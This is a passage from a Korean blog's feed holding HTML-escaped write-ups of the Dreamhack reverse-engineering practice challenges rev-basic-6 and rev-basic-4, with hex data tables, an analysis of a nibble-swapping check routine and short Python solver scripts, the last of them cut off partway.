class=&quot;mi&quot;&gt;92&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;06&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E4&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;87&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DF&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;간단한 해결책&lt;/p&gt;

&lt;p&gt;byte_140003000 인덱스 0부터 끝까지 하나씩 돌림&lt;/p&gt;

&lt;p&gt;byte_140003020 내부에서 byte_140003000[i] 가 존재한다면 해당 인덱스는 뭔지 저장&lt;/p&gt;

&lt;p&gt;코딩 ㄱ&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;00 4D 51 50 EF FB C3 CF 92 45 4D CF F5 04 40 50 43 63&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003000_str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&aposapos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003020_str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;byte_140003020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003020_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;index_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;index_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;결과&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_19.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_19.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-6</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-6</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-4 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-분석&quot; id=&quot;markdown-toc-0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-동적-분석&quot; id=&quot;markdown-toc-1-동적-분석&quot;&gt;1. 동적 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000&quot; id=&quot;markdown-toc-21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;PE64&lt;/li&gt;
  &lt;li&gt;C언어로 작성&lt;/li&gt;
  &lt;li&gt;패킹은 안됐을 것 같아서 검사 패스&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-동적-분석&quot;&gt;1. 동적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;큰일났다 사전에 문제 4개 풀기로 합의했는데 그거 쌩짜로 까먹고 2개라고 굳세게 주장하면서 나만 2개 풀었다&lt;/p&gt;

&lt;p&gt;이제부터 엉덩이에 먼지나게 문제푼다 실시&lt;/p&gt;

&lt;p&gt;사용자 인풋을 콘솔 통해서 stdin으로부터 받음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001220&lt;/code&gt;은 사용자 입력값을 scanf 계열 함수를 사용해 받을 것이다&lt;/p&gt;

&lt;p&gt;확인해 보니 맞다&lt;/p&gt;

&lt;p&gt;검증 루틴인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001000&lt;/code&gt;을 확인해 보자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이렇게 보니까 영 가독성이 떨어진다. 변수를 바꿔서 예쁘게 보이도록 해주자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;검증 루틴의 루프가 총 0x1C회 돌기 때문에, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;byte_140003000&lt;/code&gt; 배열은 총 28 byte의 데이터를 담고 있을 것이다.&lt;/p&gt;

&lt;p&gt;그렇다면 해당 배열에는 어떤 데이터가 들어있을까?&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E3&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 검증 루프 조건문을 해석해 보자.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;(24&lt;em&gt;*x&lt;/em&gt;)&lt;/td&gt;
      &lt;td&gt;(&lt;em&gt;x&lt;/em&gt;»4) 는 (&lt;em&gt;x&lt;/em&gt;«4)&lt;/td&gt;
      &lt;td&gt;(&lt;em&gt;x&lt;/em&gt;»4) 와 동치된다.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;즉, 검증 루틴의 수식은 아래와 같이 변경 가능하다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(usr_input[i]&amp;lt;&amp;lt;4) | (usr_input[i]&amp;gt;&amp;gt;4) != byte_140003000[i]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;usr_input[i] 가 1byte짜리인 것을 감안하면, 앞뒤 4bit씩을 교환하는 의미를 가지고 있음을 알 수 있다.&lt;/p&gt;

&lt;p&gt;그렇다면 동일하게, 무엇이 알맞은 usr_input[i] 인지를 알고 싶다면&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usr_input[i] = (byte_140003000[i]&amp;lt;&amp;lt;4) | (byte_140003000[i]&amp;gt;&amp;gt;4)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;가 될 것이다.&lt;/p&gt;

&lt;p&gt;이를 프로그램으로 구현해 보자.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# 프로그램 내부에 저장되어 있던 데이터 덤프 파일을 리스트로 저장tmp=[]
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./data&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;rb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byteorder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
